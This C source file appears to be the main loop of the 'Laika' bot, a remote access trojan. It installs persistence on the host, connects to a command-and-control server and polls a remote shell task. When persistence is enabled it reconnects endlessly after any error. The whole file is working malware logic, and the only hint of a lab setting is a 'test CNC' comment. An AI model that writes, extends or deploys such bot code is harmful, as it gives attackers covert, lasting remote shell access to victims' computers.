#include <stdio.h>

#include "lconfig.h"
#include "lerror.h"
#include "ltask.h"
#include "bot.h"
#include "shell.h"
#include "persist.h"

struct sLaika_taskService tService;

void shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;

    if (bot->shell)
        laikaB_readShell(bot, bot->shell);
}

int main(int argv, char *argc[]) {
    struct sLaika_bot *bot;

    /* install persistence */
    laikaB_tryPersist();

#ifdef LAIKA_PERSISTENCE
    do {
#endif
        bot = laikaB_newBot();

        /* init task service */
        laikaT_initTaskService(&tService);
        laikaT_newTask(&tService, 100, shellTask, (void*)bot);

        LAIKA_TRY
            /* connect to test CNC */
            laikaB_connectToCNC(bot, LAIKA_CNC_IP, LAIKA_CNC_PORT);

            /* while connection is still alive, poll bot */
            while (laikaS_isAlive((&bot->peer->sock))) {
                if (!laikaB_poll(bot, laikaT_timeTillTask(&tService))) {
                    laikaT_pollTasks(&tService);
                }
            }
        LAIKA_TRYEND

        /* bot was killed or it threw an error */
        laikaT_cleanTaskService(&tService);
        laikaB_freeBot(bot);
#ifdef LAIKA_PERSISTENCE
        sleep(5);
    } while (1);
#endif

    return 0;
}